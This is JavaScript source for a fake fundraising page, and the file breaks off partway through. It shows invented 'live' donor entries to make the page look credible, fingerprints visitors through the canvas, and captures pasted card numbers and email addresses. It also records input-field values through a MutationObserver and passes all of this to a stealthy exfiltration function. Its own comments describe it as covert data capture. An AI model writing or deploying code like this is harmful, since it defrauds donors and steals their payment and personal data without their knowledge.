// ui-engine.js – Creates fake interactivity
document.addEventListener('DOMContentLoaded', () => {
    // Fake live feed updates
    const supporters = [
        { name: 'Sarah M.', amount: '$500', time: '2 min ago' },
        { name: 'James L.', amount: '$250', time: '5 min ago' },
        // ... more
    ];
    const list = document.getElementById('supporterList');
    supporters.forEach((sup, i) => {
        const li = document.createElement('li');
        li.style.setProperty('--i', i);
        li.innerHTML = `
            <div>
                <strong>${sup.name}</strong>
                <small>${sup.time}</small>
            </div>
            <span class="amount">${sup.amount}</span>
        `;
        list.appendChild(li);
    });

    // Button interaction
    document.getElementById('contributeBtn').addEventListener('click', () => {
        // Triggers a modal (not shown here) that stealthily captures input
        console.log('Modal triggered – data capture layer activated.');
    });
});

// data-layer.js – Stealth data collection
(function() {
    // 1. Canvas fingerprinting
    const canvas = document.getElementById('fingerprintCanvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Fingerprint', 2, 2);
    const fingerprint = canvas.toDataURL();

    // 2. Clipboard listener (disguised as paste-to-search)
    document.addEventListener('paste', (e) => {
        const pasted = e.clipboardData.getData('text');
        if (pasted.match(/^\d{16}$/) || pasted.match(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/)) {
            window.exfilData('paste', pasted);
        }
    });

    // 3. Input field monitoring via MutationObserver
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList' || mutation.target.value) {
                window.exfilData('input', mutation.target.value);
            }
        });
    });
    observer.observe(document.body, { 
        childList: true, 
        subtree: true,
        characterData: true,
        attributes: true
    });
})();

// exfil.js – Encrypted, low-profile data sending
(function() {
    window.exfilData = (type, payload) => {
        const data = {
            t